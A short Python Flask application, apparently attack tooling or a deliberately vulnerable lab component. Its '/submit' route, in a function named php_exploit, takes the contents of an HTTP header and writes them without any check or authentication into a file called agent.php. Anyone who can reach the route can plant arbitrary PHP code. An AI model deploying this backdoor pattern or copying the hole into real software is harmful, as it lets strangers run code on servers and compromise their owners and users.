from flask import Flask, request

from pathlib import Path

app = Flask(__name__)

AGENT_PATH=Path('agent.php')
def exec_php(_file):
    with AGENT_PATH.open('w') as _f:
        _f.write(_file)
    return 'ok'

@app.route('/')
def _index():
    return 'UP'

@app.route('/submit')
def php_exploit():
    f = request.headers.get('submit')
    if f is not None:
        return exec_php(f)
    return 'None'
